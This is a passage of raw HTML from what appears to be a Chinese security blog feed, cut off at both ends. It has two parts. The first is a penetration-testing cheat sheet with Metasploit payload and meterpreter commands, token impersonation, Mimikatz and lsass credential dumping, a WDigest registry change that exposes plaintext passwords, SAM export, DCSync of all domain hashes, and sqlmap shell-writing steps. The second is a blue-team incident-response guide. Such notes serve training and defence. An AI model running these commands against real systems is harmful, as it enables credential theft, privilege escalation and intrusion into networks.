class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p>然后运行 exploit&#x2F;multi&#x2F;handler 监听模块并且在靶机上运行脚本即可</p><p>3.cmdshell–&gt;meterpreter</p><p>sessions 查看会话类型，如果是 cmdshell 可以选择输入 session -u id 来升级 然后 sessions id 进入会话</p><p>收集信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> arp_scanner -r  c段ip  查看主机状态<br><span class="hljs-built_in">run</span> post/multi/recon/local_exploit_suggester      查看msf的提权<br></code></pre></td></tr></table></figure><h5 id="二-提权"><a href="#二-提权" class="headerlink" title="二.提权"></a>二.提权</h5><h6 id="1-绕过-UAC"><a href="#1-绕过-UAC" class="headerlink" title="1.绕过 UAC"></a>1.绕过 UAC</h6><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EeXObrz16oc7RpxMmuOc9d8Intc.png" alt="截图"></p><p>这里输入 background 挂起会话，使用 MSF 中的模块直接进行提权，在会话中输入 getsystem 即可</p><h6 id="2-系统漏洞"><a href="#2-系统漏洞" class="headerlink" title="2.系统漏洞"></a>2.系统漏洞</h6><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h5 id="三-进程迁移"><a href="#三-进程迁移" class="headerlink" title="三.进程迁移"></a>三.进程迁移</h5><p>将 msf 和进程进行绑定来降低被杀的概率</p><p>1.查看进程 getpid</p><p>2.查看正在运行进程 ps</p><p>3.绑定 migratepid id</p><h5 id="四-令牌假冒"><a href="#四-令牌假冒" class="headerlink" title="四.令牌假冒"></a>四.令牌假冒</h5><p>令牌：windows 提供的一个类似于 cookies 的功能，用来分辨用户身份，如果域管理员登陆过这个终端，那可以直接假冒域管理员</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">查看当前用户 getuid<br>进入模块 <span class="hljs-keyword">use</span> incognito<br>查看存在的令牌 list_tokens-u<br>伪造 impersonate_token <span class="hljs-built_in">token</span>\\用户名<br></code></pre></td></tr></table></figure><h5 id="五-获取凭证"><a href="#五-获取凭证" class="headerlink" title="五.获取凭证"></a>五.获取凭证</h5><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者 hash，再尝试登录内网其它服务器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">取出密码 <span class="hljs-built_in">run</span> hashdump<br>使用mimikatz模块<br>wdigest抓内存中的明文<br>kiwi模块<br></code></pre></td></tr></table></figure><h5 id="六-端口转发"><a href="#六-端口转发" class="headerlink" title="六.端口转发"></a>六.端口转发</h5><h6 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h6><p>portfwd -l 本地端口 -r 内网 ip -p 内网端口</p><h6 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h6><p>1.添加路由表 route add 内网 ip 子网掩码 sessionid （route print 查看）</p><p>2.socks 代理</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/GNT1bbDYfoMl88xO6VAcECbfnUh.png" alt="截图"></p><h5 id="七-后门"><a href="#七-后门" class="headerlink" title="七.后门"></a>七.后门</h5><h6 id="metsvc-服务启动"><a href="#metsvc-服务启动" class="headerlink" title="metsvc(服务启动)"></a>metsvc(服务启动)</h6><h6 id="persistant"><a href="#persistant" class="headerlink" title="persistant"></a>persistant</h6><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs diff">nmap hostname/ip或者多个ip或者子网192.168.123.*<br><span class="hljs-deletion">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="hljs-deletion">-A 包含了-sV，-O，探测操作系统信息和路由跟踪（激烈扫描，一般不用）</span><br><span class="hljs-deletion">-O 探测操作系统信息</span><br><span class="hljs-deletion">-sV 查找主机服务版本号</span><br><span class="hljs-deletion">-sA 探测该主机是否使用了包过滤器或防火墙（建议使用wafw00f）</span><br><span class="hljs-deletion">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="hljs-deletion">-sT TCP connect扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="hljs-deletion">-sP ping扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="hljs-deletion">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="hljs-deletion">-sN TCP空扫描 </span><br><span class="hljs-deletion">-F 快速扫描</span><br><span class="hljs-deletion">-p 指定端口/端口范围</span><br><span class="hljs-deletion">-oN 将报告写入文件</span><br><span class="hljs-deletion">-v 详细信息</span><br><span class="hljs-deletion">-T&lt;0-5&gt; 设定速度</span><br>使用脚本：<br><span class="hljs-deletion">--script all 使用所有脚本</span><br><span class="hljs-deletion">--script=sql.injection.nse sql注入</span><br><span class="hljs-deletion">--script=&quot;smb*&quot; 扫smb系列</span><br>一、4 大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS侦测(-O)<br>二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Nullscan等<br>三、绕过 ping 扫描参数为：nmap -Pn XXX.XXX.XXX.XXX<br>四、漏洞检测可直接 nmap 目标 --script=auth,vuln<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PHLcb9Jq5oj1JaxXkx7cGZT3n4e.png" alt="截图"></p><p>四扫：（sn 扫主机）</p><p>半开扫端口-sT –minrate 10000 -p-</p><p>udp 扫端口 -sU -p-</p><p>扫详细（服务版本，默认脚本，系统版本） -sT -sV -sC -O -p</p><p>漏洞扫描 –scipt&#x3D;vulnW</p><p>nmap 默认使用-sS 只发送 syn 标志位进行扫描，快但是不如-sT 准确，同时 S 容易受到防火墙过滤不完整的包</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Dr2LbBwm2o4G9Dx3kKQcEySpn6f.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PFVzbM6RzoMJlFxbMUec1oe7nB2.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Hn54bBGLRoNU3Ex2c6hcyE4lnkf.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NFb1b7l4goaJW0xWReBcBvuXnSf.png" alt="截图"></p><h2 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a><strong>SQLmap</strong></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-u 单个URL <br>-m xx<span class="hljs-selector-class">.txt</span> 多个URL<br>-d <span class="hljs-string">&quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;</span> 作为服务器客户端，连接数据库<br><span class="hljs-attr">--data</span> post/get都适用<br>-<span class="hljs-selector-tag">p</span> 指定扫描的参数<br>-r 读取文件<br>-f 指纹信息<br><span class="hljs-attr">--tamper</span> 混淆脚本，用于应用层过滤<br><span class="hljs-attr">--cookie</span> <span class="hljs-attr">--user-agent</span> <span class="hljs-attr">--host</span> 对http头的修改<br><span class="hljs-attr">--threads</span> 并发线程，默认为<span class="hljs-number">1</span><br><span class="hljs-attr">--dbms</span> MySQL&lt;<span class="hljs-number">5.0</span>&gt; 指定数据库或版本<br>–level=LEVEL 执行测试的等级（<span class="hljs-number">1</span>-<span class="hljs-number">5</span>，默认为 <span class="hljs-number">1</span>）<br>–risk=RISK 执行测试的风险（<span class="hljs-number">0</span>-<span class="hljs-number">3</span>，默认为 <span class="hljs-number">1</span>） Risk升高可造成数据被篡改等风险<br>–current-db 获取当前数据库名称<br>–dbs 枚举数据库管理系统数据库<br>–tables 枚举 DBMS 数据库中的表<br>–<span class="hljs-attribute">columns</span> 枚举 DBMS 数据库表列<br>-D DB 要进行枚举的数据库名<br>-T TBL 要进行枚举的数据库表<br>-C COL 要进行枚举的数据库列<br>-U USER 用来进行枚举的数据库用户<br>常用的tamper：<br>base64encode<span class="hljs-selector-class">.py</span> 转为b64编码<br>charencode<span class="hljs-selector-class">.py</span> url编码<br>chardoubleencode<span class="hljs-selector-class">.py</span> 双URL编码<br>unmagicquotes<span class="hljs-selector-class">.py</span> 宽字节<br>randomcomments<span class="hljs-selector-class">.py</span> 用<br>`<span class="hljs-comment">/**/</span><br>`分割SQL关键字<br>space2plus<span class="hljs-selector-class">.py</span> space2comment<span class="hljs-selector-class">.py</span> space2xxxx<span class="hljs-selector-class">.py</span> 替换空格为xx<br>Post注入：<br>sqlmap -r <span class="hljs-string">&quot;数据包地址&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;参数&quot;</span> -dbms 数据类型<br>Get注入：<br>sqlmap -u <span class="hljs-string">&quot;注入点地址&quot;</span> <span class="hljs-attr">--dbms</span> 参数<br>sqlmap进行交互式写shell：<br><span class="hljs-number">1</span>-前提条件：最高权限、知道web网站绝对路径、能获取到cookie<br><span class="hljs-number">2</span>-sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;注入点地址&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;cookie值&quot;</span> <span class="hljs-attr">--os-shell</span><br>-echo “一句话木马”&gt;网站的绝对路径<br><span class="hljs-number">3</span>-输入web网站的绝对路径<br><span class="hljs-number">4</span>-传木马<br></code></pre></td></tr></table></figure><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a><strong>wireshark</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">过滤源<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">src</span>==1.1.1.1;,<br>目的<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">dst</span>==1.1.1.1;<br>过滤 80 端口:tcp.<span class="hljs-attribute">port</span>==80,<br>源端口:tcp.<span class="hljs-attribute">srcport</span>==80,<br>目的端口:tcp.<span class="hljs-attribute">dstport</span>==80<br>协议直接输入,如 http 协议 http<br>过滤 get/post 包 http.request.<span class="hljs-attribute">mothod</span>==”GET/POST”<br>tcp http内容：tcp（http） contains <span class="hljs-string">&quot;/api&quot;</span><br>http url内容http.request.uri ==<span class="hljs-string">&quot;/api&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h3><p>原理是抓lsass.exe的内存</p><p><code>提升权限 privilege::debug</code></p><p><code>抓取密码 sekurlsa::logonpasswords</code></p><p><code>win10与2012R2后启动密码保存在内存中</code></p><p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code> </p><h3 id="sam表抓hash"><a href="#sam表抓hash" class="headerlink" title="sam表抓hash"></a>sam表抓hash</h3><p>利用sam表</p><p><code>导出SAM数据 reg save HKLM\SYSTEM SYSTEM reg save HKLM\SAM SAM</code> </p><p><code>使用mimikatz提取hash lsadump::sam /sam:SAM /system:SYSTEM</code></p><h3 id="不落地"><a href="#不落地" class="headerlink" title="不落地"></a>不落地</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">导出lsass procdump64.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">本地抓密码mimikatz.exe <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">输出本地mimikatz.exe <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt<br></code></pre></td></tr></table></figure><h3 id="PTH-1"><a href="#PTH-1" class="headerlink" title="PTH"></a>PTH</h3><h3 id="DCSync抓hash"><a href="#DCSync抓hash" class="headerlink" title="DCSync抓hash"></a>DCSync抓hash</h3><p>模拟dc跨域同步获取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出域内指定用户的信息(包括哈希值)</span><br>lsadump::dcsync /domain:whoamianony.org /user:administrator <br>lsadump::dcsync /domain:whoamianony.org /user:administrator /csv<br><br><span class="hljs-comment"># 导出域内所有用户的信息(包括哈希值)</span><br>lsadump::dcsync /domain:whoamianony.org /all    <br>lsadump::dcsync /domain:whoamianony.org /all /csv<br></code></pre></td></tr></table></figure><h1 id="弹-shell"><a href="#弹-shell" class="headerlink" title="弹 shell"></a>弹 shell</h1><p>reg 上传去正向连接。或探测出网协议，如 dns，icmp</p>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蓝队笔记</title>
    <link href="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><blockquote><p><a href="https://bypass007.github.io/Emergency-Response-Notes/Summary/">https://bypass007.github.io/Emergency-Response-Notes/Summary/</a></p></blockquote><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/image-20240627161826663.png" alt="image-20240627161826663"></p><blockquote><p><a href="https://mp.weixin.qq.com/s/APfr2ctaq1GHNpJeSxQ3EQ">https://mp.weixin.qq.com/s/APfr2ctaq1GHNpJeSxQ3EQ</a></p></blockquote><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/TVzebfwneormWox5u6Rc5RM0ne6.png" alt="截图"></p><h3 id="应急前沟通"><a href="#应急前沟通" class="headerlink" title="应急前沟通"></a>应急前沟通</h3><blockquote><p>现场现象是什么?如何发现的?(依据是什么) ?<br>什么时候发现的?<br>目前是否有做物理隔离(断网) ?<br>受害机器是哪个?<br>受害服务有几台?(1 台&#x2F;N 台)<br>最先发现是哪台 ?<br>这台服务器对外有哪些服务?<br>这台服务器于其他机器是否处于同一个内网?<br>操作系统类型?<br>是否有公网映射业务?<br>远程管理方式?<br>网络边界有没有流量监控设备?<br>主机侧是否有 EDR 等安全设备</p></blockquote><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/image-20240627162018816.png" alt="image-20240627162018816"></p><h3 id="问题处置"><a href="#问题处置" class="headerlink" title="问题处置"></a>问题处置</h3><blockquote><p>事件判断:判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS等等。以及安全事件的危害程度 </p><p>临时处置:给出客户临时处置建议，断网隔离，保护现场环境，切断供给链</p><p>深入分析:收集客户信息和中毒主机信息，包括<strong>样本，日志分析、进程分析、启动项分析、样本分析</strong>。 </p><p>清理处置:直接杀掉进程，删除文件，打补丁，抑或是修复文件。 产出报告:整理并输出完整的安全事件报告</p></blockquote><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/FcYTbAtNmorqJ7x0WQpctu9onac.png" alt="截图"></p><h2 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h2><h3 id="Web-攻击"><a href="#Web-攻击" class="headerlink" title="Web 攻击"></a><strong>Web 攻击</strong></h3><p><strong>相关表现:</strong> 页面被篡改、恶意推广、黑词黑页、webshell<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等 app 分享告警、首页敏感内容、拖库、内网沦陷等排查<br><strong>要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 备份文件;webshell 后门查杀;web 日志分析;web 中间件缓存处理;web 中间件配置检查;重启 web 中间件;服务器后门检查;<br><strong>防护措施:</strong> 加固相关 web 应用，修改相关系统的所有用户密码</p><h3 id="链路劫持"><a href="#链路劫持" class="headerlink" title="链路劫持"></a><strong>链路劫持</strong></h3><p><strong>相关表现:</strong> 区域性服务不可用或返回异常内容<br><strong>相关危害:</strong> 导致搜索引擎告警、微信等 app 分享告警、首页敏感内容等<br><strong>排查要点:</strong> 能否多个环境下复现异常现象;确定相关资产是否存在;恶意文件是否确实存在于服务器上<br><strong>操作要点:</strong> 跨地区、运营商进行测试，确定受影响范围:在能复现的环境中判断是 DNS 劫持还是 HTTP 劫持<br><strong>防护措施:</strong> 重要业务部署 https</p><h3 id="代理隧道"><a href="#代理隧道" class="headerlink" title="代理隧道"></a><strong>代理隧道</strong></h3><p><strong>相关表现:</strong> 持续性或间断性外连行为，通常为 tcp 协议，对内网多个主机有访问行为<br><strong>相关危害:</strong> 作为跳板机攻击其他内网资产<br><strong>排查要点:</strong> 确定存在代理隧道的跳板机，通常为某时间段内集中访问内网多种资源的机器，判断隧道类型<br><strong>防护措施:</strong> 完善内网 acl，服务器按业务需要通过白名单策略访问外网</p><h3 id="替换系统命令"><a href="#替换系统命令" class="headerlink" title="替换系统命令"></a><strong>替换系统命令</strong></h3><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面<br><strong>操作要点:</strong> 使用静态链接的 busybox;重新安装被替换的包<br><strong>命令:</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">rpm -Va<br>dpkg <span class="hljs-comment">--verify</span><br></code></pre></td></tr></table></figure><h3 id="ld-so-preload-动态链接库劫持"><a href="#ld-so-preload-动态链接库劫持" class="headerlink" title="ld.so.preload 动态链接库劫持"></a><strong>ld.so.preload 动态链接库劫持</strong></h3><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 检查&#x2F;etc&#x2F;ld.so.preload，ld.so(如&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so)<br><strong>操作要点:</strong> 使用静态链接的 busybox; 重启被注入恶意模块的进程，必要时直接重启系统</p><h3 id="内核态-rootkit"><a href="#内核态-rootkit" class="headerlink" title="内核态 rootkit"></a><strong>内核态 rootkit</strong></h3><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:隐藏文件、进程等信息<br><strong>排查要点:</strong> 确定是否存在无法使用常规命令查看的文件、进程;<br><strong>操作要点:</strong> 使用 tyton 内核态 rootkit 检测工具检测:检查&#x2F;etc&#x2F;modules 是否有未知的内核模块</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><strong>计划任务</strong></h3><p><strong>相关表现:</strong> 特定时间间隔触发木马、后门、网络链接、DNS 请求、篡改页面等行为<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:周期性篡改页面、拉取数据等<br><strong>排查要点:</strong> 判断是否存在周期性出现的异常现象，检查&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;，&#x2F;etc&#x2F;cron.*等常用计划任务配置文件<br><strong>操作要点:</strong> 停止计划任务服务后再操作;注意辨别利用\r 回车符的障眼法小技巧</p><h3 id="远控木马"><a href="#远控木马" class="headerlink" title="远控木马"></a><strong>远控木马</strong></h3><p><strong>相关表现:</strong> 有持续或间断性的对外网络链接或 DNS 请求等通信行为<br><strong>相关危害:</strong> 窃取系统资料、作为跳板进一步攻击内网其他机器<br><strong>排查要点:</strong> 关注 tcp、udp、icmp 等一切网络行为，检查注册表、服务、开机目录、计划任务等一系列常见的持久化点<br><strong>操作要点:</strong> 检查网络连接，以及 IDS 设备上的异常远控告警</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><p>1.弱口令，远程端口</p><p>2.可疑账号 <code>lusrmgr.msc</code></p><p>3.隐藏账号，克隆账号</p><p>​a.打开注册表</p><p>​b.D 盾查杀</p><p>4.日志</p><p>​a、Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>​b、导出 Windows 日志–安全，利用 Log Parser 进行分析。</p><h3 id="异常端口，进程"><a href="#异常端口，进程" class="headerlink" title="异常端口，进程"></a>异常端口，进程</h3><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li>检查方法：</li><li>a、netstat -ano 查看目前的网络连接，定位可疑的 ESTABLISHED</li><li>b、根据 netstat 定位出的 pid，再通过 tasklist 命令进行进程定位 tasklist | findstr “PID”</li></ul><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/SIj7bi47ior9pXxlTvccfOplnag.png" alt="截图"></p><p>2、进程</p><ul><li>检查方法：</li><li>a、开始–运行–输入 msinfo32，依次点击“软件环境 → 正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程 ID、文件创建日期、启动时间等。</li><li>b、打开 D 盾_web 查杀工具，进程查看，关注没有签名信息的进程。</li><li>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</li><li>d、查看可疑的进程及其子进程。可以通过观察以下内容：</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">解释<br>      没有签名验证信息的进程<br>      没有描述信息的进程<br>      进程的属主<br>      进程的路径是否合法<br>      <span class="hljs-meta">CPU</span>或内存资源占用长时间过高的进程<br></code></pre></td></tr></table></figure><p>3、小技巧：</p><p>a、查看端口对应的 PID： netstat -ano | findstr “port”</p><p>b、查看进程对应的 PID：任务管理器–查看–选择列–PID 或者 tasklist | findstr “PID”</p><p>c、查看进程对应的程序位置：</p><p>任务管理器–选择对应进程–右键打开文件位置</p><p>运行输入 wmic，cmd 界面 输入 process</p><p>d、tasklist &#x2F;svc 进程–PID–服务</p><p>e、查看 Windows 服务所对应的端口：<code> %system%/system32/drivers/etc/services</code>（一般 %system% 就是 C:\Windows）</p><h3 id="启动项，计划任务，服务"><a href="#启动项，计划任务，服务" class="headerlink" title="启动项，计划任务，服务"></a>启动项，计划任务，服务</h3><p>1、检查服务器是否有异常的启动项。</p><ul><li>检查方法：</li><li>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</li><li>b、单击开始菜单 &gt;【运行】，输入 <strong>msconfig</strong>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</li><li>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项： <code>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</code> 检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</li><li>d、利用安全软件查看启动项、开机时间管理等。</li><li>e、组策略，运行 gpedit.msc。</li></ul><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/QU71bN1s7oqej9xtJCRcdKvknmc.png" alt="截图"></p><p>2、检查计划任务</p><ul><li>检查方法：</li><li>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</li><li>b、单击【开始】&gt;【运行】；输入 <strong>cmd</strong>，然后输入 <strong>at</strong>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <strong>services.msc</strong>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <strong>systeminfo</strong>，查看系统信息</li></ul><p>2、查找可疑目录及文件</p><ul><li>检查方法：<ul><li>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</li><li><code> Window 2003 C:\Documents and Settings</code><br><code> Window 2008R2 C:\Users\</code></li></ul></li></ul><p>3、得到发现 WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/image-20240627162645478.png" alt="image-20240627162645478"></p><p><strong>系统日志</strong></p><ul><li>分析方法：</li><li>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</li><li>b、Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</li><li>C、导出应用程序日志、安全日志、系统日志，利用 Log Parser 进行分析。</li><li><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/SWF3b6fXyoi5UzxjU3pcmeVTneg.png" alt="截图"></li></ul><p><strong>WEB 访问日志</strong></p><ul><li>分析方法：</li><li>a、找到中间件的 web 日志，打包到本地方便进行分析。</li><li>b、推荐工具：Window 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</li><li>Linux 下，使用 Shell 命令组合查询分析</li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">获取本机用户列表: net user</span><br><span class="hljs-section">本机管理员: net localgroup administrators</span><br><span class="hljs-section">查看当前会话: net session</span><br><span class="hljs-section">查看当前运行的服务: net start</span><br><span class="hljs-section">远程连接: net use</span><br><span class="hljs-section">查看当前用户下的共享目录: net share</span><br><span class="hljs-section">最近打开的文件:</span><br>%UserProfile%\Recent<br>%APPDATA%\Microsoft\Windows\Recent<br><span class="hljs-section">查找文件中的字符串: 